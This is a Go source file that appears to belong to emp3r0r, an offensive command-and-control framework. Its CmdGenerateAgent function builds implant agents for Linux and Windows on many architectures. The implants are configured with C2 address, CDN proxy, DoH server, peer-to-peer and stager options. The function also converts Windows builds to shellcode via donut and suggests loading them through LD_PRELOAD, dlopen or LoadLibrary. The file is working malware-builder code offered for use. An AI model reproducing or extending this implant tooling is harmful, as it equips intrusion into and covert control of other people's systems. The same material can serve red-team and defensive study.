package operator

import (
	"slices"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/api/client"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/controllers"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/donut"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/spf13/cobra"
)

const (
	PayloadTypeLinuxExecutable   = "linux_executable"
	PayloadTypeWindowsExecutable = "windows_executable"
	PayloadTypeWindowsDLL        = "windows_dll"
	PayloadTypeLinuxSO           = "linux_so"
)

var PayloadTypeList = []string{
	PayloadTypeLinuxExecutable,
	PayloadTypeLinuxSO,
	PayloadTypeWindowsExecutable,
	PayloadTypeWindowsDLL,
}

var Arch_List_Windows = []string{
	"386",
	"amd64",
	"arm64",
}

var Arch_List_Windows_DLL = []string{
	"386",
	"amd64",
	"arm64",
}

var Arch_List_Linux_SO = []string{
	"amd64",
	"386",
	"arm",
	"riscv64",
}

var Arch_List_All = []string{
	"386",
	"amd64",
	"arm",
	"arm64",
	"mips",
	"mips64",
	"riscv64",
}

// CmdGenerateAgent generates agent binary
func CmdGenerateAgent(cmd *cobra.Command, args []string) {
	// Parse flags (UI layer)
	payloadType, _ := cmd.Flags().GetString("type")
	archChoice, _ := cmd.Flags().GetString("arch")

	if !isArchValid(payloadType, archChoice) {
		logging.Errorf("Invalid arch choice")
		return
	}

	// Gather config from flags
	p2p, p2pChanged := getBoolFlag(cmd, "p2p")
	directC2, directC2Changed := getBoolFlag(cmd, "direct-c2")
	ncsi, ncsiChanged := getBoolFlag(cmd, "ncsi")
	kcp, kcpChanged := getBoolFlag(cmd, "kcp")
	isStager, isStagerChanged := getBoolFlag(cmd, "stager")

	opts := controllers.AgentConfig{
		CCAddress:        getStringOpt(cmd, "cc"),
		CDNProxy:         getStringOpt(cmd, "cdn"),
		C2TransportProxy: getStringOpt(cmd, "proxy"),
		DoHServer:        getStringOpt(cmd, "doh"),
		InitialPeers:     getStringSliceOpt(cmd, "peers"),
		P2PTransport:     getStringOpt(cmd, "p2p-transport"),
	}

	// Assign booleans only if they were explicitly changed, or default to current live.RuntimeConfig settings
	opts.IsP2PEnabled = live.RuntimeConfig.IsP2PEnabled
	if p2pChanged {
		opts.IsP2PEnabled = p2p
	}
	opts.IsDirectC2 = live.RuntimeConfig.IsDirectC2Enabled
	if directC2Changed {
		opts.IsDirectC2 = directC2
	}
	opts.IsNCSIEnabled = live.RuntimeConfig.EnableNCSI
	if ncsiChanged {
		opts.IsNCSIEnabled = ncsi
	}
	opts.UseKCP = live.RuntimeConfig.UseKCP
	if kcpChanged {
		opts.UseKCP = kcp
	}
	opts.IsStager = live.RuntimeConfig.IsRunByStager
	if isStagerChanged {
		opts.IsStager = isStager
	}

	// Pass config to controller
	if err := controllers.MakeConfig(opts); err != nil {
		logging.Errorf("Failed to configure agent: %v", err)
		return
	}

	// Build agent (business logic via controller)
	// 1. Generate UUID
	agentUUID := uuid.NewString()

	// 2. Sign UUID with server
	sig, err := client.SignAgent(agentUUID)
	if err != nil {
		logging.Errorf("Failed to sign agent UUID: %v", err)
		return
	}

	buildCfg := controllers.AgentBuildConfig{
		PayloadType:  payloadType,
		Arch:         archChoice,
		Timestamp:    time.Now(),
		WorkSpace:    live.EmpWorkSpace,
		AgentUUID:    agentUUID,
		AgentUUIDSig: sig,
	}

	result, err := controllers.BuildAgent(buildCfg, live.RuntimeConfig)
	if err != nil {
		logging.Errorf("Failed to build agent: %v", err)
		return
	}

	// Success (UI layer)
	logging.Infof("Generated agent UUID: %s", result.AgentUUID)
	logging.Debugf("Config payload: %d bytes", result.ConfigSize)
	logging.Successf("Generated %s from %s and %s", result.OutputFile, result.StubFile, live.EmpConfigFile)

	// Generate shellcode for Windows (UI layer)
	if payloadType == PayloadTypeWindowsExecutable || payloadType == PayloadTypeWindowsDLL {
		donut.DonoutPE2Shellcode(result.OutputFile, archChoice)
	}

	// Informational messages (UI layer)
	if payloadType == PayloadTypeLinuxExecutable {
		logging.Infof("Use stager module to create a shared library stager that delivers the agent with encryption and compression. You will need another stager to load the shared library (or use LD_PRELOAD)")
	}
	if payloadType == PayloadTypeLinuxSO {
		logging.Infof("Note: linux_so supports CGO and can be loaded as a shared library using LD_PRELOAD or dlopen()")
	}
	if payloadType == PayloadTypeWindowsDLL {
		logging.Infof("Note: windows_dll supports CGO and can be loaded as a DLL using LoadLibrary() or similar methods")
	}
}

// Helpers for reading flags cleanly
func getBoolFlag(cmd *cobra.Command, name string) (bool, bool) {
	val, _ := cmd.Flags().GetBool(name)
	return val, cmd.Flags().Changed(name)
}

func getStringOpt(cmd *cobra.Command, name string) string {
	if cmd.Flags().Changed(name) {
		val, _ := cmd.Flags().GetString(name)
		return val
	}
	return ""
}

func getStringSliceOpt(cmd *cobra.Command, name string) []string {
	if cmd.Flags().Changed(name) {
		val, _ := cmd.Flags().GetStringSlice(name)
		return val
	}
	return nil
}

func isArchValid(payload_type, arch_choice string) bool {
	var list []string
	switch payload_type {
	case PayloadTypeWindowsExecutable:
		list = Arch_List_Windows
	case PayloadTypeWindowsDLL:
		list = Arch_List_Windows_DLL
	case PayloadTypeLinuxSO:
		list = Arch_List_Linux_SO
	default:
		list = Arch_List_All
	}
	return slices.Contains(list, arch_choice)
}
